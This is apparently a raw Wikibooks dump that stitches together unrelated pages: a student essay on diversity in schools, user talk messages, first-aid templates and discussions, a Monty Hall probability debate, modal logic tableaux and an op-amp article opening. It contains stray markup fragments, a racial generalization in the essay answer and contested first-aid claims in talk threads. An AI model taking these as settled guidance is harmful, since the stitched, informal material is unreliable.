Education should target two major factors:  1) teachers need to be prepared to meet the needs of a wide variety of diverse learners and 2) teachers need to create an environment for the children that builds a stronger transition from school to university or school to the workforce (Rodriguez &amp; Zozkiewicz, 2007).   Both factors are vital in establishing intrinsic values in the children which can be carried through primary and into secondary education.   Many children around the world drop out of school because they believe that on the job training is more important than a formal education (Wikibooks, 2007).   The No Child Left Behind (NCLB) legislature adopted a strategy to ensure all students successfully completed primary and secondary education.    NCLB pushed schools to develop curriculums for their students which contained “hands-on, minds-on activities that [were] socio-culturally relevant and tied into the everyday life of the learner” (Rodriguez &amp; Zozkiewicz, 2007).    Apparently, the orators of the NCLB legislature realized when children adopt healthy intrinsic values towards their own education then high retention rates are theoretically obtainable.     For this cause, many schools are creating multicultural workshops and diversity training for their teachers.   Attendance is generally mandatory and the courses are usually offered annually (Bremerton School District Community Forum, 2007).

==Application and Implementation of Strategies Learned==

Washington D.C.: Nov 11, 2005. pg. A.25}}

Meeting the needs of a wide variety of diverse learners or minorities does create “challenges, tensions, and risks” (Rodriguez &amp; Zozkiewicz, 2007) for the school.  Newly appointed Principal Scott O’Neill relates some of the challenges he encountered during the early phase of diversification.   Lincoln Elementary School experienced an increase in Hispanics over a period of six years.   The Hispanic community was now equivalent to the Caucasian community.    English speaking Hispanics did not create a challenge for Principle O’Neill, as a matter of fact, in the academic year of 2003-2004, 82% of Hispanic third graders passed the state’s test for Adequate Yearly Progress (AYP) in mathematics.  In comparison their Caucasian counter parts AYP score in mathematics was 85%.    The achievement gap remained considerably close in other academic areas of study, not to mention, the achievement gap remained considerably close for all other ethnicities enrolled at Lincoln Elementary School (Salmonowicz, 2007).    Hispanics were no longer the minority; however, English for Speakers of other Languages (ESOL) became the new minority.   Principle O’Neill felt the tension from parents and teachers regarding the school’s non-English speaking students.   The parents were fearful that the lesson plans would be tailored to meet the learning needs of ESOL; therefore, objectives for the state’s standard of learning (SOL) requirements would never be met.  He recounts a concerned parent inquiring whether or not to disenroll her child from Lincoln Elementary because she feared the school would slide from “good to worse” (Salmonowicz, 2007).    He had to constantly reassure all parents, including ESOL parents that standards for learning would not be compromised.    Principle O’Neill discovered many of his staff were even far less supportive of the new plans towards diversification, statements were made like, “They don’t need to be here,” “I can’t teach them,” and “I’ve got Hispanic kids and they don’t speak English” (Salmonowicz, 2007).    Unquestionably, the teachers perceived the school district had set them up for failure.   The teachers, faculty and administrators of Lincoln Elementary soon found themselves putting into practice the diversity training they had acquired.   Principal O’Neill used the text book lectures to some degree but he desired to look to the larger municipalities, like Chicago, Boston, and New York City for real time solutions (Salmonowicz, 2007 ). 

==Support at the District Level==
The district must continue to provide training to educators, as well as, to parents on diversification.    The training for parents can be as simple as forwarding an advertisement about a scheduled community event built around a socio-cultural theme, like Asian Heritage or Ramadan.   Additionally, school districts can afford the schools the latitude for hosting speakers during family night or PTA meetings to address socio-cultural topics of Rap music, homosexuality, My Space, etc.   The training parents receive prevents students from being prematurely dis-enrolled from a school because certain misnomers have generated throughout the community regarding a particular minority group.   School districts can also sponsor community forums to educate parents and family members about programs geared to assist minorities.     Understandably, the district must provide a considerable support through appropriations.   Mansfield School District demonstrated through its foreign language program the kind of financial support needed for diversification to work.   In Mansfield all grades from second through fifth learn Spanish; sixth graders have the option of learning Spanish, French, German, or Latin; what’s more important Mansfield committed a substantial amount of funding for the recruitment of minorities in their school system (Braccidiferro, 2005).   The school district of Mansfield, Connecticut demographics contains an overwhelmingly stable population of white middle-class Christians, yet the citizens of Mansfield realized the importance of maintaining an environment where those with dissimilarities feel appreciated.

==Conclusion==
While growing up in northern New Jersey, Shamim Patwa recalls how isolated she felt as the only family from India (Braccidiferro, 2005).   How should we think about minorities?   Consider, the isolation felt by Ms. Patwa, the child with ADHD, the child with homosexual parents, the bully, or the ESOL students.   “Since, the concept of education is a global constant, a global right and a global need” (Wikibooks, 2007).   The job of teachers should be to care for all students, yet recognize students are individuals, as individuals the assistance offered must be tailored to each child’s specific need.   Teachers’ attitudes regarding meeting the specific needs of all children, including minorities is not a new equal opportunity concept.   If parents, teachers, faculty, administrators all work together then meeting the specific needs can be accomplished because “we shared the responsibility” and “made it happen” (Salmonowicz, 2007).

==Essay Question==

{{question-answer|question=The information technology (IT) classes in your high school are typically enrolled with young Caucasian males.  What strategies would you suggest to make the IT courses more appealing to African-American students?
|answer=First, I realize high school students are granted the privilege of selecting elective courses that meet their own intrinsic values.   However, the perception of an all white male class might cause others to question whether or not blacks belong in the IT class.   I agree fully with the statement that, “the education process is a global constant, a global right, and a global need.”   Since, technology is becoming a major part of education.    African Americans, whom comprise the global content of your school, must be assured that they do belong in an IT class.     Some students don’t sign up for certain courses because they lack confidence in the benefits that may arise from taking the course.    Others decline their enrollment in a particular course because they lack confidence in their own abilities to successfully complete the course.   Still others avoid admittance because they “don’t want to be the only one.”   For this cause, intervention has to come from educators and parents to prompt African American students to enroll in other classes outside of the classes selected by their immediate peer group.
Furthermore, realizing that knowledge gives a child “the power to change his own circumstances,” the school’s administration must render front line support to the effort of making the IT courses more appealing to African Americans.   Administrators can sponsor projects that lead to the recruitment of other genders and ethnicities for employment in their IT department.   Additionally, the administrator can schedule student led IT fairs, competitions and assemblies that allow African American students to view some of the projects created by their own peers.    In other words, the IT department should receive just as much hype as the athletic division.   Intervention from parents appears to be the greatest challenge, especially since many African Americans come from single parent homes.   Most of these homes consist of a young mother who is working two jobs or long hours (in some cases trying to further her own education) to support her children financially.   However, during scheduled parent/teacher conferences educators must impress upon parents to influence their children to enroll in IT courses.   If administrators, teachers, and parents exhibit more interest and support for enrolling African Americans in the IT courses, quite possibly African Americans might realize they belong in the IT classes offered by at your high school.}}

* Wikibooks is a collection of open-source textbooks. See [[WB:WIW|What is Wikibooks]] to find out what types of books are acceptable.
* To learn the wiki-markup-language syntax, see [[Help:Editing]].
* You should sign your name on Talk and vote pages using four tildes, like this: &amp;#126;&amp;#126;&amp;#126;&amp;#126; 
**There is a box at the top of the edit window that will insert this, too; it looks like part of a signature.
* Remember to conduct any editing experiments in the [[Wikibooks:Sandbox|sandbox]].
* You can tell the community something about yourself in your userpage.
** You can get to this page by clicking the tab at the top of the page labeled with your registered username.
* If you are a '''Wikipedian''', see [[Wikibooks:Wikibooks for Wikipedians]] for a primer on how things work here (it's a little different).
** If you want to base your work here on materials from Wikipedia, please use [[WB:RFI]] (requests for importation) to bring the material over in compliance with the GFDL.
* If you're an '''instructor''' and plan on using Wikibooks for a class project, see [[Wikibooks:Guidelines for class projects]]
* Please say hello at the [[WB:SL|Staff Lounge]] with any questions or ideas.
* Eventually, you might want to read the [[Wikibooks:Manual of Style|Manual of Style]] and [[Wikibooks:Policies and guidelines|Policies and Guidelines]].
** Please take a look at [[Wikibooks:Naming policy]] before starting a new book.
* Remember to maintain a [[Wikibooks:Neutral point of view|Neutral point of view]].
* Explore, [[Wikibooks:Be bold in updating pages|be bold in editing pages]], and have fun!

== Fair use images ==

G'day, I notice that you are uploading a number of images under copyright, claiming fair use provisions under the laws of the USA. Please read our [[Wikibooks:Fair use policy|fair use policy]], and then edit each image to provide an explanation of how it meets this policy. If an image doesn't meet this policy, please mark it for deletion using the {{tl|delete}} template. cheers, [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 02:05, 18 July 2007 (UTC)

'''Thanks for uploading [[:Image:Infoshare.jpg]].''' The [[w:Wikimedia Foundation|Wikimedia Foundation]] is very careful about what Wikibooks includes because of [[w:United States copyright law|copyright law]], and requires that we maintain a strict [[Wikibooks:Copyright|copyright policy]]. [[:Image:Infoshare.jpg]] and other files you uploaded may soon be deleted unless a [[Wikibooks:Media#Non-free use|rationale]] for a fair use claim is provided.

In order to upload fair use material, specific rationale must be provided as to why fair use media is necessary, and how there are no free alternatives. Images or other media that do not have such rationale will likely be deleted as a copyright violation. If the information of a fair use media component could be duplicated by a free alternative, that media may not be uploaded. Please edit image descriptions pages directly to add {{tlx|fair use rationale}}; there's no need to upload the image again. If you have any questions, feel free to contact me, or [[WB:HELP|ask another Wikibookian]].

See {{UserImages2}} for a complete list of your uploads which may get deleted soon.&lt;br/&gt;Thank you. [[User:MonoBot|MonoBot]] ([[User talk:MonoBot|talk]]) 00:24, 10 March 2008 (UTC)}}</text>

==Nice Work==
Nice work on the CPR pages.  Thanks for pitching in! -- [[User:Jomegat|Jim Thomas (aka Jomegat)]] 14:38, 26 March 2007 (UTC)

THANKS! can you help? please?? [[User:Mike.lifeguard|Mike.lifeguard]] 04:14, 27 March 2007 (UTC)

: What sort of help do you need? -- [[User:Jomegat|Jim Thomas (aka Jomegat)]] 04:45, 27 March 2007 (UTC)

:: What sort of help don't I need? I guess you have some experience, so I could use your help in making a better way of navigating through the first aid book. I'd really like a shortened version of the table of contents in a box at the top left - like infoboxes in wikipedia. That's be sweet. Is there any way to figure out if anyone else is contributing to this book? [[User:Mike.lifeguard|Mike.lifeguard]] 15:20, 27 March 2007 (UTC)

:: I also don't know how to add/delete/move chapters/sections in the book. Which I'll need to do later. [[User:Mike.lifeguard|Mike.lifeguard]] 15:23, 27 March 2007 (UTC)

:::;TOC: I haven't messed with custom TOCs or navigation, so I can't help there.  But you could ask on the staff lounge (I guess technical chat).  Or if you've seen a book whose navigation you like, edit the page and see how they did it.
:::;Other contributors: Just click the &quot;history&quot; tab at the top of a page.
:::;Adding chapters: The easiest way to add a chapter is to add a reference to it, like this:
:::::&lt;nowiki&gt;[[First aid/CPR/New Chapter]]&lt;/nowiki&gt; 
::::Which should render as a red link.  Click the link and add content, and bingo - new chapter.
:::;Deleting chapters: deleting can only be done by admins.  You can add a delete template like this and an admin will see it: &lt;nowiki&gt;{{delete|reason for deletion}}&lt;/nowiki&gt;
:::;Moving pages: There's a move tab at the top of the page.
::: Hope that helps.  -- [[User:Jomegat|Jim Thomas (aka Jomegat)]] 15:36, 27 March 2007 (UTC)

::::Oh, one other thing.  I visited every page of my book - even when each page was still a red link - and added it to my watch list.  That's a pretty good way to see what has changed ''lately'', or if anyone has added a new page. -- [[User:Jomegat|Jim Thomas (aka Jomegat)]] 18:13, 27 March 2007 (UTC)

== Hello, Welcome! ==

Hello mike.lifeguard, welcome to wikibooks! I've seen your work on the first aid book, and it is looking good. If you have questions, you can always ask me, or you can post them at the staff lounge and other people will be happy to help as well. Don't hesitate to ask! Good luck and happy authoring. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 02:36, 20 April 2007 (UTC)
:Thanks for the quick reply. I started fooling around with the navigation thingy from Human Physiology... I think It'll work. I'm fine with editing content, but I'll probably be asking for help with more complicated things again. [[User:Mike.lifeguard|Mike.lifeguard]] 02:42, 20 April 2007 (UTC)

::It's okay, nobody is perfect at all the tricks when they first get here. the formatting and HTML and all is enough to make anybody need help. I've been here for almost 2 years and i still have to ask for help every now and again. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 02:44, 20 April 2007 (UTC)

::: I figured out how to move pages, but apparently I can't overwrite pages. And I can't delete them, then move the page. And I'm not about to move them manually. Suggestions? Also, what should be done with the old talk pages? Should they be kept somehow... what's the deal here? [[User:Mike.lifeguard|Mike.lifeguard]] 02:51, 20 April 2007 (UTC)

== [[Adventist Youth Honors Answer Book/Health and Science/First Aid, Basic]] ==

Hi Mike,

Thanks for leaving a message on the talk page of our chapter on first aid.  The requirements for the AY honors are set by a committee, and I do not have latitude to change them.  Not being an expert myself, I took most of the answers from several U.S. Navy Training Manuals.  But if you see things in there that are out-of-date, I think it's perfectly OK to note that in the answers.  Thanks again for your willingness to help.  --[[User:Jomegat|Jomegat]] 00:46, 24 June 2007 (UTC)

== Re:&quot;Processing Page Text&quot; ==

Thanks for pointing this out, I explained myself in more detail on the books [[Talk:First Aid|talk page]]. If you have any other questions, let me know. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 23:34, 28 June 2007 (UTC)

== Questioning ==

Excuse me but something really serious keeps happening over Wikipedia-they label themselves &quot;'''The Free Encyclopedia'''&quot;, but my partners and I performed editing on articles having very questionable subject and topics and subdivision articles. We used sandboxes ''intently'' previously. We really believe Wikipedia has outdated article or section and redesigning ''should'' be done, but then when whosoever edits those articles, someome out of nowhere shows up and mentions &quot;Please do not try this way or that&quot;! Worsening things is that when we question Wikipedia the editors keep accusing you of using ad homimens!

Can anybody explain please?

      <text xml:space="preserve">==Notes for use==
For all of these templates, you'll have to use html markup to insert lists. Wikimarkup won't render properly. I'm trying to get it fixed.

More info on html lists: [[m:Help:List]]

=='''[[Template:FA Regional Note]]'''==
{{FA Regional Note|To call this template, use: {{tlx|FA Regional Note|text for the note goes here}}}}
This is going to be used for bringing attention to region or country-specific info. For example, when we talk about calling EMS, it might be noted that it's 911 in N. America, but ___ elsewhere, and may not be available at all in some areas.

===[[Template:FA Regional Note Left]]===
{{FA Regional Note Left|To call this template, use {{tlx|FA Regional Note Left|text for the note goes here}}}}
This is the same as the one above, but aligned left instead.










=='''[[Template:FA Best Practice]]'''==
{{FA Best Practice|To call this template, use: {{tlx|FA Best Practice|text for the note goes here}}}}
This template will be used to highlight the best way of doing something when there are multiple methods available. For example, using a &quot;log cabin&quot; is probably better than a &quot;doughnut bandage.&quot;

===[[Template:FA Best Practice Left]]===
{{FA Best Practice Left|To call the template, use {{tlx|FA Best Practice Left|text for the note goes here}}}}
This is the same template as above, but aligned left instead.











=='''[[Template:FA X]]'''==
{{FA X|To call this template, use: {{tlx|FA X|text for the note goes here}}}}
This template will be used as a warning that doing something is dangerous to the victim or is contrary to established standards. For example, reducing a fracture.

===[[Template:FA X Left]]===
{{FA X Left|To call this template, use {{tlx|FA X Left|text for the note goes here}}}}
This is the same as the previous template, but aligned left instead.











=='''[[Template:FA Caution]]'''==
{{FA Caution|To call this template, use: {{tlx|FA Caution|text for the note goes here}}}}
This template will be used to indicate danger to the rescuer. For example, failing to don gloves.

===[[Template:FA Caution Left]]===
{{FA Caution Left|To call this template, use {{tlx|FA Caution Left|text for the note goes here}}}}
This is the same as the previous template, but aligned left instead.












=='''[[Template:FA Advanced Topics]]'''==
{{FA Advanced Topics}}
This template will include boilerplate text letting the reader know that this module/section/chapter deals with techniques requiring advanced training. To call the template, use {{tlx|FA Advanced Topics}}

{{BookCat}}</text>

      <text xml:space="preserve">==Flutter Valve==
Is this too &quot;complex&quot; for the lay-rescuer?  Also, in a flutter valve, only one corner is left open, not a whole side. [[User:Mike6271|Mike6271]] 03:21, 6 July 2007 (UTC)
:I don't think so - it's the standard treatment in every course I've ever taught. I've never heard of only one corner being left open - it's always a full side. The lowest side (dependent on victim positioning) is left open. What's the rationale for only one corner?? ''' &amp;ndash; [[User:Mike.lifeguard|Mike.lifeguard]]''' | &lt;sup&gt;[[User talk:Mike.lifeguard|talk]]&lt;/sup&gt; 03:25, 6 July 2007 (UTC)
::In the Brady Emergency Care 8th Edition Text book and the ARC Emergency Response book, they have it taped on all 4 sides with a corner open.  I suppose either work...this one just ensures a better seal by having a smaller space open.  Also in the book it says &quot;if patient's condition declines after sealing puncture wound (sucking chest wound), open the seal immediately.&quot;  I don't think that a lay-rescuer would be adequately able to assess the patient.  Also, we should include that regular household plastic wrap may fail when used and isn't strong enough.  Also in the book it says &quot;some EMS systems now recommend leaving one entire side unsealed.&quot;  Brady 10th edition says do the 4 sides and leave the corner open...but I guess whichever you want works.  They all accomplish pretty much the same thing. [[User:Mike6271|Mike6271]] 04:40, 6 July 2007 (UTC)

==Abdominal Injuries==
&quot;cover the organs with a moist, sterile dressing (not paper products - use gauze) or a .&quot;

There is obviously something missing at the end of the sentence. Also, at the course I attended, they taught us to use a material that won't soak up - something like plastic kitchen foil or plastic bag. '''Definitely not gauze''', for it can stick to organs (especialy small intestine was mentioned as sensitive to damage from sticking).
--[[User:Šedý|Šedý]] ([[User talk:Šedý|talk]]) 19:58, 18 August 2009 (UTC)
:Abd pads or Telfa are ideal; gauze is ok; paper products are a major no-no. I'm not sure why plastic wrap would be a good idea - although it is impenetrable and nonstick, it can't absorb saline or water to keep the organs moist, which is one of our aims here. Can you explain why plastic wrap would be better than an abd pad/telfa and show me where a major training organization advocates that? &amp;nbsp;'''&amp;mdash;&amp;nbsp;[[User:Mike.lifeguard|&lt;b style=&quot;color:#309;&quot;&gt;Mike.lifeguard&lt;/b&gt;]]'''&amp;nbsp;&amp;#124;&amp;nbsp;&lt;sup&gt;[[User talk:Mike.lifeguard|&lt;span style=&quot;color:#309;&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 03:19, 19 August 2009 (UTC)</text>

      <text xml:space="preserve">==Semi-Prone vs. Recovery==
Why is it the semi-prone position instead of the recovery position?  Recovery position is used numerous times throughout the wikibook, so why switch to semi-prone here? [[User:Mike6271|Mike6271]] 03:27, 6 July 2007 (UTC)
:a) it fits the acronym
:b) they're the same thing by different names.
:If only for the sake of a) I'd suggest changing it everywhere else to ''semi-prone''. ''' &amp;ndash; [[User:Mike.lifeguard|Mike.lifeguard]]''' | &lt;sup&gt;[[User talk:Mike.lifeguard|talk]]&lt;/sup&gt; 03:31, 6 July 2007 (UTC)
::Why not '''S'''hock (Recovery) Position?
:::The 'proper' name for it is ''semi-sitting'', which accurately describes the position. Recovery or Shock position is just a colloquialism. Also, please remember to sign all your posts with four tildes (&lt;nowiki&gt;~~~~&lt;/nowiki&gt;) ''' &amp;ndash; [[User:Mike.lifeguard|Mike.lifeguard]]''' | &lt;sup&gt;[[User talk:Mike.lifeguard|talk]]&lt;/sup&gt; 16:41, 6 July 2007 (UTC)

::::I don't think semi-sitting and recovery position are the same thing at all! As for the terminology, i say stay with recovery position throughout, and just disambiguate at its own page. [[User:Owain.davies|Owain.davies]] 17:54, 7 August 2007 (UTC)

::::Further to this, as this about shock, the most important treatment for all patients is the raising of the legs, to return blood to the body's core! I have changed the text to reflect this [[User:Owain.davies|Owain.davies]] 18:12, 7 August 2007 (UTC)

== What Can Be Done? ==

It has been requested that this page be expanded, so what can we do to expand shock? --[[User:Nugger|Nugger]] 16:52, 19 July 2007 (UTC)

== Recovery Position ==

The Best Practice section emphasizes to place ''pregnant'' victims on their left side. Whereas this should be done for ALL victims being put into the recovery position. (The exception being those victims with bleeding wounds, however these wounds should be stopped of bleeding before a victim is put into the recovery position.)--[[User:Nugger|Nugger]] 21:04, 6 August 2007 (UTC)

:It is only pregnant women where the side you incline the victim makes any difference at all, as the foetus may obstruct the inferior vena cava, potentially causing a lack of blood flow (and therefore shock).  In any case, most of the time, you don't get an option, as there is usually a logical way to roll them in a confined space! [[User:Owain.davies|Owain.davies]] 17:56, 7 August 2007 (UTC)</text>

      <text xml:space="preserve">== The two versions are talking about different things ==

The first one is talking about switching cases, the second version is talking about switching to the banker's offer which is a completely different problem.


== Switching cases in Deal or no Deal is NOT equivalent to the Monty Hall problem ==

The real question we want to answer is the following:

&quot;What is the probability you are holding the $1,000,000 case '''given that you have two cases to choose from and one of them contains $1,000,000'''?&quot;


Whenever the word '''given''' shows up we're likely dealing with conditional probability, which is certainly the case here. The probability that event A will happen '''given''' that event B happens is

&lt;math&gt;
\frac{\mathrm{Probability}(A (\mathrm{AND}) B)}{\mathrm{Probability}(B)}
&lt;/math&gt;

In this situation, A represents &quot;the event that you are holding the $1,000,000 case&quot;, and B represents &quot;the event that there are two cases left, one of which contains the $1,000,000&quot;.


'''Monty Hall'''

Consider a version of the Monty Hall problem where you have to pick between 26 cases, where one contains $1,000,000 and the others contain lesser amounts. After you pick your case, Monty opens 24 cases which do not contain $1,000,000 and gives you the option to switch cases.

The probability that you are holding the $1,000,000 case is &lt;math&gt;\frac{1}{26}&lt;/math&gt;. Having two cases left, where one of them contains the $1,000,000 dollars '''always''' occurs, so the probability is &lt;math&gt;1&lt;/math&gt;. The above formula shows that the probability that you are holding the $1,000,000 case given that you are choosing between two cases where one contains $1,000,000 to be &lt;math&gt;\frac{1}{26}&lt;/math&gt;.


'''Deal or no Deal'''

The probability that you are holding the $1,000,000 case is again &lt;math&gt;\frac{1}{26}&lt;/math&gt;, and again if you pick the $1,000,000 case, you will always end up with the million dollar choice. But the probability that you end up with the million dollar choice in general is only &lt;math&gt;\frac{2}{26}&lt;/math&gt; in deal or no deal. The above formula shows that the probability that you are holding the $1,000,000 case given that you are choosing between two cases where one contains $1,000,000 to be &lt;math&gt;\frac{1}{2}&lt;/math&gt;.


It's clear that there is no advantage to switching in Deal or no Deal, because the odds that you are already holding the $1,000,000 case are 50:50.

== Problems with Version 2 ==

Version 2 is wrong. I propose changing it to something like this:

It is sometimes argued that, ''&quot;The former seems to ignore the fact that, assuming that at a given point in the game, there are multiple low dollar amounts in the left column and one high dollar amount in the right column, the expected value in dollars approximates one-half of the right column's dollar amount instead of the unchecked briefcases' average, which is because at the start of the game, it is equally likely that a briefcase from the left or right side (below or above the median) is picked by the contestant - a fact which does not change throughout the game. This constitutes a variant of the Monty Hall Problem, in which it is better to switch to the banker's offer that overestimates the potential of the chosen briefcase, if there are many dollar amounts on the right side of the screen and only few on the left.&quot;''

However this is incorrect for a number of reasons:
# Monty Hall only works because the host knows which door has a car behind it, and so can deliberately avoid it. In Deal Or No Deal, cases are opened at random.
# The chance of a case being above or below the median ''does'' change as brief cases are opened. The opening of these cases adds extra information, which needs to be factored in, by application of [http://en.wikipedia.org/wiki/Bayes%27_theorem Bayes' Theorem]; in which P(A) is the chance of a high money case, and P(B) is the chance of several low money cases being opened at the start.
# Consider the situation when there are 10 unopened cases, one for a high dollar amount and nine for a low dollar amount. The argument runs that the contestant's case had a 50/50 chance of being a high dollar amount at the start, and so it still has a 50/50 chance of being high. The problem is that this same logic can be applied '''to all other unopened cases'''. Since it is impossible for all ten unopened cases to have a 50/50 chance of having a high dollar amount, we can see that the reasoning is wrong.

[[User:Peter Ballard|Peter Ballard]] 12:23, 17 September 2007 (UTC)

Peter I agree completely.  As you say the critical point of the Monty Hall problem is the host's knowledge.  I was tempted to say remove this section completely.   But given that there is a lot of misunderstanding on this subject, then I like your version.  I say put your version in. --[[User:AdRiley|AdRiley]] 14:50, 17 September 2007 (UTC)

:Thanks. I'm not sure I've expressed point 2 in a way which is completely accurate (I have studied probability, but it was a long time ago), so perhaps someone can improve it. But for me point 3 is what made me sure I was right. [[User:Peter Ballard|Peter Ballard]] 23:52, 17 September 2007 (UTC)

::After trying to explain the logic behind Version 2 to my family last night, I've come to the conclusion that the logic is so flawed that it doesn't deserve the dignity of a mention; all that is required is to make the correct reasoning (i.e. the old version 1) a little clearer. [[User:Peter Ballard|Peter Ballard]] 00:13, 19 September 2007 (UTC)

:::Yes I have just re-read the old version 1 and it isn't clear.  I don't like the bit about fixing the chance of the top prize being 1, it isn't necessary.  In fact Deal or no Deal works as you would logically expect, it is Monty Hall that is the more complex to understand and it all comes down to the hosts knowledge of where the prize is.  --[[User:AdRiley|AdRiley]] 12:59, 19 September 2007 (UTC)

== This does not appear to be an article about Game Theory. ==

Game theory is a well-established branch of theoretical statistics, which has existed for many decades. I see very little of Game theory in this.

This article appears to be more about Psychology and how experience influences behaviour in areas of uncertainty. [[User:Rolo Tamasi|Rolo Tamasi]] ([[User talk:Rolo Tamasi|talk]])</text>

      <text xml:space="preserve">==Modal Logic Tableaux==

In classical propositional logics we introduced a tableau calculus (Definition)  for a logic &lt;math&gt;L&lt;/math&gt;  as  a finitely branching
tree whose nodes are   formulas from &lt;math&gt;L&lt;/math&gt;.
Given a set &lt;math&gt;\Phi&lt;/math&gt; of formulae from &lt;math&gt;L&lt;/math&gt;, a tableau for &lt;math&gt;\Phi&lt;/math&gt; was constructed
by a (possibly infinite) sequence of applications of a  tableau rule schema:

&lt;math&gt;
\rho \frac{\psi}{D_1 \mid D_2 \mid \cdots \mid  D_n}
&lt;/math&gt;

where the premise &lt;math&gt;\psi&lt;/math&gt; as well as the denominators &lt;math&gt;D_1, \cdots ,D_n&lt;/math&gt; are sets
of formulae; &lt;math&gt;\rho&lt;/math&gt; is the name of the rule.
We introduce  &lt;math&gt;K&lt;/math&gt;-tableau with the help of the following rules:


&lt;math&gt;(\land) \frac{X; P\land Q} {X; P; Q} &lt;/math&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;math&gt; (\lor) \frac{X; \lnot(P\land Q)} {X; \lnot P; \mid X; \lnot Q}&lt;/math&gt;&lt;br&gt;&lt;br&gt;

&lt;math&gt;(\bot) \frac{X;P; \lnot P}{\bot}&lt;/math&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;        &lt;math&gt;(\lnot)  \frac{X; \lnot\lnot P} {X; P}&lt;/math&gt;&lt;br&gt;&lt;br&gt;

&lt;math&gt;(\theta) \frac{X; Y}{X}&lt;/math&gt;
&amp;nbsp;&amp;nbsp;
&amp;nbsp;&amp;nbsp;
&amp;nbsp;&amp;nbsp;
&amp;nbsp;&amp;nbsp;
&amp;nbsp;&amp;nbsp;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;math&gt;(K) \frac{\square X; \lnot \square P} {X;\lnot  P}&lt;/math&gt;

A tableau for a set &lt;math&gt;X&lt;/math&gt; of formulae is a finite tree with root &lt;math&gt;X&lt;/math&gt; whose
nodes carry finite formulae sets. The rules for extending a tableau are given
by:
  
*choose a leaf node &lt;math&gt;n&lt;/math&gt; with label &lt;math&gt;Y&lt;/math&gt;, where &lt;math&gt;n&lt;/math&gt; is not an end node, and choose a rule &lt;math&gt;\rho&lt;/math&gt;, which is applicable to &lt;math&gt;n&lt;/math&gt;; 
*if &lt;math&gt;\rho &lt;/math&gt; has &lt;math&gt;k&lt;/math&gt; denominators then create &lt;math&gt;k&lt;/math&gt; successor nodes for &lt;math&gt;n&lt;/math&gt;, with successor &lt;math&gt;i&lt;/math&gt; carrying an appropriate instance of denominator   &lt;math&gt;D_i&lt;/math&gt;; 
*if a successor &lt;math&gt;s&lt;/math&gt; carries a set &lt;math&gt;Z&lt;/math&gt; and &lt;math&gt;Z&lt;/math&gt; has already appeared on   the branch from the root to &lt;math&gt;s&lt;/math&gt; then &lt;math&gt;s&lt;/math&gt; is an end node. 
A branch is called closed if its end node is carrying &lt;math&gt;{\bot}&lt;/math&gt;, otherwise it is
open.


As in the classical case, a formulae &lt;math&gt;A&lt;/math&gt; is a theorem in modal logic &lt;math&gt;K&lt;/math&gt;,
iff there is a closed &lt;math&gt;K&lt;/math&gt;-tableau for the set &lt;math&gt;\lnot A&lt;/math&gt;.

As an example take the formula &lt;math&gt;\square (p \to q) \to (\square p \to \square q)&lt;/math&gt;:
its negation is certainly unsatisfiable, because the formula is an instance of
our previously given &lt;math&gt;K&lt;/math&gt;-axiom.



Some remarks are in order:
  
*The &lt;math&gt;\theta&lt;/math&gt;- rule, called the thinning rule, is necessary in order to construct the premisses for the application of the &lt;math&gt;K&lt;/math&gt;-rule. 
*Both can be combined by a new rule 
&lt;center&gt;&lt;math&gt;(K\theta) \frac{Y; \square X; \lnot   \square P} {X;\lnot  P} &lt;/math&gt;&lt;/center&gt; 
*In order to get tableau calculi for the other mentioned calculi, like &lt;math&gt;T&lt;/math&gt; or &lt;math&gt;K4&lt;/math&gt; one has to introduce additional rules:  
&lt;center&gt;&lt;math&gt;(T)\frac{ X; \lnot   \square P} {X; \square P; P}&lt;/math&gt;&lt;/center&gt;
which obviously reflects reflexivity of the reachability relation, or 
&lt;center&gt;&lt;math&gt;(K4) \frac{ \square X; \lnot   \square P} {X; \square X; \lnot P}&lt;/math&gt;&lt;/center&gt; reflecting  transitivity.

&lt;center&gt;&lt;span style=&quot;font-size:140%&quot;&gt;'''How to Present the Op-amp I-to-V Converter in a More Attractive Manner'''&lt;/span&gt;&lt;/center&gt;

&lt;center&gt;&lt;span style=&quot;font-size:130%&quot;&gt; '''''(Intended for Enthusiastic Electronics Teachers Who Want Students to Really Understand Circuits)'''''&lt;/span&gt;&lt;/center&gt;


&lt;span style=&quot;font-size:100%; color:#FF0000&quot;&gt;'''Circuit idea:''' ''The op-amp eliminates the resistance by adding as much voltage to the input voltage source as it loses across the resistor.''&lt;/span&gt;

   
[[Image:Active_i-to-v_attr_how_to_convert_450.jpg|right|thumb|250px|&lt;center&gt;Fig. 1. How to show the circuit operation in a more attractive way?&lt;/center&gt;]]

== The initial circuit arrangement ==

Imagine that we have to solve a well-known problem - to measure a current I&lt;sub&gt;IN&lt;/sub&gt; that flows if we short a real voltage source having an internal voltage V&lt;sub&gt;IN&lt;/sub&gt; and a resistance Ri. For this purpose, in the [[Circuit Idea/Op-amp Inverting Current-to-Voltage Converter|basic story]] about the op-amp inverting current-to voltage converter, we have broken the circuit and connected a measuring resistor R to obtain an output voltage V&lt;sub&gt;OUT&lt;/sub&gt; = V&lt;sub&gt;R&lt;/sub&gt;. Only, the voltage drop V&lt;sub&gt;R&lt;/sub&gt; across the resistor R was affecting the input current. So, we have compensated the &quot;disturbing&quot; voltage V&lt;sub&gt;R&lt;/sub&gt; by an &quot;anti-voltage&quot; V&lt;sub&gt;H&lt;/sub&gt; (we have &quot;helped&quot; the input voltage source by another voltage source) and used it as an output voltage (see Fig. 2 below).

